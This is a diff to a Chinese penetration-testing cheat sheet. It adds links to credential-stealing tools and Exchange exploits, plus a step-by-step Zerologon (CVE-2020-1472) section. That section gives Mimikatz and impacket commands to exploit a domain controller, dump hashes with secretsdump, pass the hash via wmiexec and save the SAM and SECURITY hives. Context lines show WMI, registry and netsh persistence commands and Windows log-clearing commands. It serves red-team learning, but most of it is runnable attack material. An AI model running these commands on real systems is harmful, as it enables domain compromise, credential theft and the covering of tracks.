@@ -81,25 +81,25 @@ Table of Contents
             * [10、文件关联](#10文件关联)
             * [11、<a href="http://www.liuhaihua.cn/archives/357579.html" rel="nofollow">bitsadmin</a>](#11bitsadmin)
             * [12、<a href="https://evi1cg.me/archives/Powershell_MOF_Backdoor.html" rel="nofollow">mof </a>](#12mof-)
-            * [13、<a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/" rel="nofollow">wmi</a>](#13wmi)
-            * [14、<a href="https://3gstudent.github.io/3gstudent.github.io/Userland-registry-hijacking/" rel="nofollow">Userland Persistence With Scheduled Tasks</a>](#14userland-persistence-with-scheduled-tasks)
-            * [15、<a href="https://3gstudent.github.io/3gstudent.github.io/Netsh-persistence/" rel="nofollow">Netsh</a>](#15netsh)
-            * [16、<a href="https://3gstudent.github.io/3gstudent.github.io/渗透测试中的Application-Compatibility-Shims/" rel="nofollow">Shim</a>](#16shim)
-            * [17、<a href="https://3gstudent.github.io/3gstudent.github.io/DLL劫持漏洞自动化识别工具Rattler测试/" rel="nofollow">DLL劫持</a>](#17dll劫持)
-            * [18、<a href="https://3gstudent.github.io/3gstudent.github.io/渗透测试中的Application-Verifier(DoubleAgent利用介绍)/" rel="nofollow">DoubleAgent </a>](#18doubleagent-)
-            * [19、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence/" rel="nofollow">waitfor.exe </a>](#19waitforexe-)
-            * [20、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence/" rel="nofollow">AppDomainManager</a>](#20appdomainmanager)
+            * [13、<a href="https://3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe" rel="nofollow">wmi</a>](#13wmi)
+            * [14、<a href="https://3gstudent.github.io/Userland-registry-hijacking" rel="nofollow">Userland Persistence With Scheduled Tasks</a>](#14userland-persistence-with-scheduled-tasks)
+            * [15、<a href="https://3gstudent.github.io/Netsh-persistence" rel="nofollow">Netsh</a>](#15netsh)
+            * [16、<a href="https://3gstudent.github.io/渗透测试中的Application-Compatibility-Shims" rel="nofollow">Shim</a>](#16shim)
+            * [17、<a href="https://3gstudent.github.io/DLL劫持漏洞自动化识别工具Rattler测试" rel="nofollow">DLL劫持</a>](#17dll劫持)
+            * [18、<a href="https://3gstudent.github.io/渗透测试中的Application-Verifier(DoubleAgent利用介绍)" rel="nofollow">DoubleAgent </a>](#18doubleagent-)
+            * [19、<a href="https://3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence" rel="nofollow">waitfor.exe </a>](#19waitforexe-)
+            * [20、<a href="https://3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence" rel="nofollow">AppDomainManager</a>](#20appdomainmanager)
             * [21、Office](#21office)
-            * [22、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-maintain-persistence/" rel="nofollow">CLR</a>](#22clr)
-            * [23、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-msdtc-to-maintain-persistence/" rel="nofollow">msdtc</a>](#23msdtc)
-            * [24、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator/" rel="nofollow">Hijack CAccPropServicesClass and MMDeviceEnumerato</a>](#24hijack-caccpropservicesclass-and-mmdeviceenumerato)
-            * [25、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe/" rel="nofollow">Hijack explorer.exe</a>](#25hijack-explorerexe)
+            * [22、<a href="https://3gstudent.github.io/Use-CLR-to-maintain-persistence" rel="nofollow">CLR</a>](#22clr)
+            * [23、<a href="https://3gstudent.github.io/Use-msdtc-to-maintain-persistence" rel="nofollow">msdtc</a>](#23msdtc)
+            * [24、<a href="https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator" rel="nofollow">Hijack CAccPropServicesClass and MMDeviceEnumerato</a>](#24hijack-caccpropservicesclass-and-mmdeviceenumerato)
+            * [25、<a href="https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe" rel="nofollow">Hijack explorer.exe</a>](#25hijack-explorerexe)
             * [26、Windows FAX DLL Injection](#26windows-fax-dll-injection)
             * [27、特殊注册表键值](#27特殊注册表键值)
             * [28、快捷方式后门](#28快捷方式后门)
-            * [29、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence/" rel="nofollow">Logon Scripts</a>](#29logon-scripts)
-            * [30、<a href="https://3gstudent.github.io/3gstudent.github.io/Password-Filter-DLL在渗透测试中的应用/" rel="nofollow">Password Filter DLL</a>](#30password-filter-dll)
-            * [31、<a href="https://3gstudent.github.io/3gstudent.github.io/利用BHO实现IE浏览器劫持/" rel="nofollow">利用BHO实现IE浏览器劫持</a>](#31利用bho实现ie浏览器劫持)
+            * [29、<a href="https://3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence" rel="nofollow">Logon Scripts</a>](#29logon-scripts)
+            * [30、<a href="https://3gstudent.github.io/Password-Filter-DLL在渗透测试中的应用" rel="nofollow">Password Filter DLL</a>](#30password-filter-dll)
+            * [31、<a href="https://3gstudent.github.io/利用BHO实现IE浏览器劫持" rel="nofollow">利用BHO实现IE浏览器劫持</a>](#31利用bho实现ie浏览器劫持)
         * [Linux](#linux-2)
             * [crontab](#crontab)
             * [硬链接sshd](#硬链接sshd)
@@ -137,6 +137,7 @@ Table of Contents
             * [NTLM relay](#ntlm-relay)
             * [Kerberos委派](#kerberos委派)
             * [地址解析协议](#地址解析协议)
+            * [Zerologon](#ZeroLogon)
         * [获取AD哈希](#获取ad哈希)
         * [AD持久化](#ad持久化)
             * [活动目录持久性技巧](#活动目录持久性技巧)
@@ -160,9 +161,9 @@ Table of Contents
         * [Bypass Applocker](#bypass-applocker)
         * [bypassAV](#bypassav)
   * [痕迹清理](#痕迹清理)
-      * [<a href="https://3gstudent.github.io/3gstudent.github.io/渗透技巧-Windows日志的删除与绕过/" rel="nofollow">Windows日志清除</a>](#windows日志清除)
+      * [<a href="https://3gstudent.github.io/渗透技巧-Windows日志的删除与绕过" rel="nofollow">Windows日志清除</a>](#windows日志清除)
       * [破坏Windows日志记录功能](#破坏windows日志记录功能)
-      * [msf](#msf)
+      * [Metasploit](#Metasploit)
       * [3389登陆记录清除](#3389登陆记录清除)
 
 
@@ -220,17 +221,19 @@ Table of Contents
 * subDomainsBrute ：https://github.com/lijiejie/subDomainsBrute
 * wydomain ：https://github.com/ring04h/wydomain
 * Sublist3r ：https://github.com/aboul3la/Sublist3r
+* 企查查：https://www.qcc.com/
+* 天眼查：https://www.tianyancha.com/
 * site:target.com:https://www.google.com
 * Github代码仓库 
 * 抓包分析请求返回值(跳转/文件上传/app/api接口等) 
 * 站长帮手links等在线查询网站 
 * 域传送漏洞 
 
-Linux
+>Linux
 ```
 dig @ns.example.com example=.com AXFR 
 ```
-Windows
+>Windows
 ```
 nslookup -type=ns xxx.yyy.cn #查询解析某域名的DNS服务器
 nslookup #进入nslookup交互模式
@@ -367,6 +370,9 @@ $ ./ew -s rssocks -d 127.0.0.1 -e 7777
 使用说明:https://rootkiter.com/Termite/README.txt 
 #### 代理脚本 
 reGeorg :https://github.com/sensepost/reGeorg
+Neo-reGeorg:https://github.com/L-codes/Neo-reGeorg
+pystinger(毒刺):https://github.com/FunnyWolf/pystinger
+ABPTTS:https://github.com/nccgroup/ABPTTS
 
 ### shell反弹 
 bash  
@@ -706,6 +712,17 @@ ftp等
 * [LaZagne](https://github.com/AlessandroZ/LaZagne)  
 * [mimipenguin](https://github.com/huntergregal/mimipenguin)
 
+##### 浏览器
+* [HackBrowserData](https://github.com/moonD4rk/HackBrowserData)
+* [SharpWeb](https://github.com/djhohnstein/SharpWeb)
+* [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
+* [360SafeBrowsergetpass](https://github.com/hayasec/360SafeBrowsergetpass)
+
+##### 其他
+* [SharpDecryptPwd](https://github.com/RcoIl/SharpDecryptPwd)
+* [Decrypt_Weblogic_Password](https://github.com/TideSec/Decrypt_Weblogic_Password)
+* [OA-Seeyou](https://github.com/jas502n/OA-Seeyou)
+
 ### 扩散信息收集 
 #### 端口扫描 
 ##### 常用端口扫描工具 
@@ -824,6 +841,7 @@ find / -user root -perm -4000 -print 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
 find / -user root -perm -4000 -exec ls -ldb {} \;
 ```
+寻找可利用bin：https://gtfobins.github.io/
 #### 系统服务的错误权限配置漏洞 
 ```
 cat /var/apache2/config.inc
@@ -978,7 +996,7 @@ Filter = $EventFilter;
 ```
 mofcomp test.mof
 ```
-##### 13、[wmi](https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/) 
+##### 13、[wmi](https://3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe) 
 
 每隔60秒执行一次notepad.exe
 ```
@@ -986,7 +1004,7 @@ wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BotFilter8
 wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BotConsumer23", ExecutablePath="C:\Windows\System32\notepad.exe",CommandLineTemplate="C:\Windows\System32\notepad.exe"
 wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"BotFilter82\"", Consumer="CommandLineEventConsumer.Name=\"BotConsumer23\""
 ```
-##### 14、[Userland Persistence With Scheduled Tasks](https://3gstudent.github.io/3gstudent.github.io/Userland-registry-hijacking/)  
+##### 14、[Userland Persistence With Scheduled Tasks](https://3gstudent.github.io/Userland-registry-hijacking)  
 劫持计划任务UserTask，在系统启动时加载dll
 ```
 function Invoke-ScheduledTaskComHandlerUserTask
@@ -1019,59 +1037,59 @@ exit
 }
 Invoke-ScheduledTaskComHandlerUserTask -Command "C:\test\testmsg.dll" -Verbose
 ```
-##### 15、[Netsh](https://3gstudent.github.io/3gstudent.github.io/Netsh-persistence/) 
+##### 15、[Netsh](https://3gstudent.github.io/Netsh-persistence) 
 ```
 netsh add helper c:\test\netshtest.dll
 ```
 后门触发：每次调用netsh
 >dll编写:https://github.com/outflanknl/NetshHelperBeacon
 
-##### 16、[Shim](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims/) 
+##### 16、[Shim](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims) 
 常用方式：
 InjectDll
 RedirectShortcut
 RedirectEXE
-##### 17、[DLL劫持](https://3gstudent.github.io/3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95/)
+##### 17、[DLL劫持](https://3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95)
 通过Rattler自动枚举进程，检测是否存在可用dll劫持利用的进程
 使用：Procmon半自动测试更精准，常规生成的dll会导致程序执行报错或中断，使用AheadLib配合生成dll劫持利用源码不会影响程序执行
 工具：https://github.com/sensepost/rattler
 工具：https://github.com/Yonsm/AheadLib
-##### 18、[DoubleAgent ](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Verifier(DoubleAgent%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D)/)
+##### 18、[DoubleAgent ](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Verifier(DoubleAgent%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D))
 编写自定义Verifier provider DLL
 通过Application Verifier进行安装
 注入到目标进程执行payload
 每当目标进程启动，均会执行payload，相当于一个自启动的方式
 POC : https://github.com/Cybellum/DoubleAgent
-##### 19、[waitfor.exe ](https://3gstudent.github.io/3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence/)
+##### 19、[waitfor.exe ](https://3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence)
 不支持自启动，但可远程主动激活，后台进程显示为waitfor.exe
 POC : https://github.com/3gstudent/Waitfor-Persistence
-##### 20、[AppDomainManager](https://3gstudent.github.io/3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence/) 
+##### 20、[AppDomainManager](https://3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence) 
 针对.Net程序，通过修改AppDomainManager能够劫持.Net程序的启动过程。如果劫持了系统常见.Net程序如powershell.exe的启动过程，向其添加payload，就能实现一种被动的后门触发机制
 ##### 21、Office 
-[劫持Office软件的特定功能](https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8/):通过dll劫持,在Office软件执行特定功能时触发后门
-[利用VSTO实现的office后门](https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8VSTO%E5%AE%9E%E7%8E%B0%E7%9A%84office%E5%90%8E%E9%97%A8/)
+[劫持Office软件的特定功能](https://3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8):通过dll劫持,在Office软件执行特定功能时触发后门
+[利用VSTO实现的office后门](https://3gstudent.github.io/%E5%88%A9%E7%94%A8VSTO%E5%AE%9E%E7%8E%B0%E7%9A%84office%E5%90%8E%E9%97%A8)
 [Office加载项](https://github.com/3gstudent/Office-Persistence)
 * Word WLL 
 * Excel XLL 
 * Excel VBA add-ins 
 * PowerPoint VBA add-ins
 
->参考1 ：https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/
+>参考1 ：https://3gstudent.github.io/Use-Office-to-maintain-persistence
 
->参考2 ：https://3gstudent.github.io/3gstudent.github.io/Office-Persistence-on-x64-operating-system/
+>参考2 ：https://3gstudent.github.io/Office-Persistence-on-x64-operating-system
 
 
-##### 22、[CLR](https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-maintain-persistence/)
+##### 22、[CLR](https://3gstudent.github.io/Use-CLR-to-maintain-persistence)
 无需管理员权限的后门，并能够劫持所有.Net程序
 POC:https://github.com/3gstudent/CLR-Injection
-##### 23、[msdtc](https://3gstudent.github.io/3gstudent.github.io/Use-msdtc-to-maintain-persistence/) 
+##### 23、[msdtc](https://3gstudent.github.io/Use-msdtc-to-maintain-persistence) 
 利用MSDTC服务加载dll，实现自启动，并绕过Autoruns对启动项的检测
 利用：向 %windir%\system32\目录添加dll并重命名为oci.dll
-##### 24、[Hijack CAccPropServicesClass and MMDeviceEnumerato](https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator/) 
+##### 24、[Hijack CAccPropServicesClass and MMDeviceEnumerato](https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator) 
 利用COM组件，不需要重启系统，不需要管理员权限
 通过修改注册表实现
 POC：https://github.com/3gstudent/COM-Object-hijacking 
-##### 25、[Hijack explorer.exe](https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe/)
+##### 25、[Hijack explorer.exe](https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe)
 COM组件劫持，不需要重启系统，不需要管理员权限
 通过修改注册表实现
 ```
@@ -1086,18 +1104,18 @@ Explorer.exe在启动时会加载`c:\Windows\System32\fxsst.dll`(服务默认开
 ##### 27、特殊注册表键值 
 在注册表启动项创建特殊名称的注册表键值，用户正常情况下无法读取(使用Win32 API)，但系统能够执行(使用Native API)。
 
-[《渗透技巧——"隐藏"注册表的创建》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA/)
+[《渗透技巧——"隐藏"注册表的创建》](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA)
 
-[《渗透技巧——"隐藏"注册表的更多测试》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E6%9B%B4%E5%A4%9A%E6%B5%8B%E8%AF%95/)
+[《渗透技巧——"隐藏"注册表的更多测试》](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E6%9B%B4%E5%A4%9A%E6%B5%8B%E8%AF%95)
 ##### 28、快捷方式后门 
 替换我的电脑快捷方式启动参数
 POC : https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1
-##### 29、[Logon Scripts](https://3gstudent.github.io/3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence/) 
+##### 29、[Logon Scripts](https://3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence) 
 ```
 New-ItemProperty "HKCU:\Environment\" UserInitMprLogonScript -value "c:\test\11.bat" -propertyType string | Out-Null
 ```
-##### 30、[Password Filter DLL](https://3gstudent.github.io/3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/) 
-##### 31、[利用BHO实现IE浏览器劫持](https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81/) 
+##### 30、[Password Filter DLL](https://3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8) 
+##### 31、[利用BHO实现IE浏览器劫持](https://3gstudent.github.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81) 
 
 #### Linux 
 ##### crontab 
@@ -1315,6 +1333,14 @@ Get-NetConnections - gets active connections to a specific server resource (shar
 Get-NetFiles - gets open files on a server
 Get-NetProcesses - gets the remote processes and owners on a remote server
 ```
+PowerView-2.0-tricks:
+```
+https://gist.github.com/HarmJ0y/3328d954607d71362e3c
+```
+PowerView-3.0-tricks
+```
+https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+```
 ##### BloodHound
 
 **获取某OU下所有机器信息**
@@ -1344,7 +1370,7 @@ Get-NetProcesses - gets the remote processes and owners on a remote server
 
 ##### 获取域内DNS信息
 * [adidnsdump](https://github.com/dirkjanm/adidnsdump)
-* [域渗透——DNS记录的获取](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DNS%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96/)
+* [域渗透——DNS记录的获取](https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DNS%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96)
 ​            
 #### 获取域控的方法 
 ##### SYSVOL 
@@ -1396,7 +1422,7 @@ net use k: \pnet use k: \pentest.comc$
 * [Kerberos的认证原理](https://blog.csdn.net/wulantian/article/details/42418231) 
 * [深刻理解windows安全认证机制ntlm＆Kerberos](https://klionsec.github.io/2016/08/10/ntlm-kerberos/) 
 
-#####  Kerberos的银票务
+##### Kerberos的银票务
 黄金票据和白银票据的一些区别：
 Golden Ticket：伪造`TGT`，可以获取`任何Kerberos`服务权限
 银票：伪造TGS，`只能访问指定的服务`
@@ -1444,6 +1470,71 @@ tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kir
 
 ##### 地址解析协议 
 实在搞不定再搞ARP 
+##### Zerologon 
+1、利用Mimikatz
+**check**
+```
+lsadump::zerologon /target:dc1.exploit.local /account:dc1$
+```
+**exploit**
+```
+lsadump::zerologon /target:dc1.exploit.local /account:dc1$ /exploit
+```
+**dcsync**
+```
+lsadump::dcsync /dc:dc1.exploit.local /authuser:dc1$ /authdomain:exploit.local /authpassword:"" /domain:exploit.local /authntlm /user:krbtgt
+```
+**restore**
+```
+lsadump::postzerologon /target:conttosson.locl /account:dc$ 
+```
+2、利用impacket：
+* 取目标主机名+IP
+* install 修改版本的impacket
+* Exp
+
+```
+python cve-2020-1472-exploit.py DC2008 10.211.55.200
+```
+![](https://blogpics-1251691280.file.myqcloud.com/imgs/20200916190137.png)
+```
+secretsdump.py -no-pass cgdomain.com/'DC2008$'@10.211.55.200 -history -just-dc-user administrator
+```
+```
+secretsdump.py -no-pass cgdomain.com/administrator@10.211.55.200 -hashes aad3b435b51404eeaad3b435b51404ee:3add1560657a19b3166247eb3eb149ae
+```
+![](https://blogpics-1251691280.file.myqcloud.com/imgs/20200916190359.png)
+
+获取到旧的密码明文hex，还原
+```
+python restorepassword.py cgdomain.com/DC2008@DC2008 -target-ip 10.211.55.200 -hexpass 59958639cbdd4523de5d42b01adb0e256e0d39aef14c8eef31f4c078862109f253bbb7b3817ab123d013856c028fa4993f5f5b9a830a3a98d87483b29df3fb55082a1f464b19220a2c04f6605d2d321a04afbb551f8f19a13d399f9f5af2aa23c5b76b49001033516fefd90cb0348256e8282b22cbf9e70d82a8b8d2916d578246e288af3af727533d36ad8950fe1c513771377d98a947c4a8eae2b581a74b6687a2e533b7e89e8d03c2e6c2123d519489869a6e33d3a8884be33107060b62e2852502261f48c097ddb68750cc55b7688cc951441cf02989a307f55c008e978edbaf31766d17b53505016c7580cb480b
+```
+![](https://blogpics-1251691280.file.myqcloud.com/imgs/20200916190457.png)
+
+
+恢复方法2
+通过wmic, pass the hash 拿到域控制器中的本地管理员权限(域管)
+```
+wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8adfc85c3490040e942ae1e6c68f645e test.local/Administrator@10.211.55.38
+```
+然后分别执行,拷贝本机中SAM数据库到本地
+```
+- reg save HKLM\SYSTEM system.save
+- reg save HKLM\SAM sam.save
+- reg save HKLM\SECURITY security.save
+- get system.save
+- get sam.save
+- get security.save
+- del /f system.save
+- del /f sam.save
+- del /f security.save
+```
+
+提取明文hash
+```
+secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
+```
+然后恢复。
 ​    
 #### 获取AD哈希 
 * 使用VSS卷影副本 
@@ -1499,7 +1590,7 @@ https://adsecurity.org/?p=2716
 http://www.vuln.cn/6812
 
 ##### Kerberoasting后门
-[域渗透-Kerberoasting](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/)
+[域渗透-Kerberoasting](https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting)
 
 ##### AdminSDHolder
 [Backdooring AdminSDHolder for Persistence](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
@@ -1518,6 +1609,8 @@ http://www.vuln.cn/6812
 * [**CVE-2020-0688**](https://github.com/Ridter/CVE-2020-0688)
 * [**NtlmRelayToEWS**](https://github.com/Arno0x/NtlmRelayToEWS)
 * [**ewsManage**](https://github.com/3gstudent/ewsManage)
+* [**CVE-2021-26855**](https://github.com/h4x0r-dz/CVE-2021-26855)
+* [**CVE-2021-28482**](https://gist.github.com/testanull/9ebbd6830f7a501e35e67f2fcaa57bda)
 
 #### TIPS 
 [《域渗透——Dump Clear-Text Password after KB2871997 installed》](https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed)
@@ -1528,7 +1621,7 @@ http://www.vuln.cn/6812
 [《域渗透——Local Administrator Password Solution》 ](http://www.liuhaihua.cn/archives/179102.html)
 >域渗透时要记得留意域内主机的本地管理员账号 
 
-[《域渗透——利用SYSVOL还原组策略中保存的密码》 ](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/)
+[《域渗透——利用SYSVOL还原组策略中保存的密码》 ](https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81)
 
 #### 相关工具 
 * [BloodHound ](https://github.com/BloodHoundAD/BloodHound)
@@ -1567,7 +1660,7 @@ http://www.vuln.cn/6812
 [UltimateAppLockerByPassList ](https://github.com/api0cradle/UltimateAppLockerByPassList)
 https://lolbas-project.github.io/ 
 
-####  bypassAV    
+#### BypassAV    
 * Empire 
 * PEspin 
 * Shellter 
@@ -1579,7 +1672,7 @@ https://lolbas-project.github.io/
 * ...
 
 ## 痕迹清理
-### [Windows日志清除](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/) 
+### [Windows日志清除](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87) 
 获取日志分类列表：
 ```
 wevtutil el >1.txt
@@ -1613,7 +1706,7 @@ wevtutil cl "windows powershell"
 * [Invoke-Phant0m](https://github.com/hlldz/Invoke-Phant0m) 
 * [Windwos-EventLog-Bypass](https://github.com/3gstudent/Windwos-EventLog-Bypass) 
 
-### msf 
+### Metasploit 
 ```
 run clearlogs 
 ```
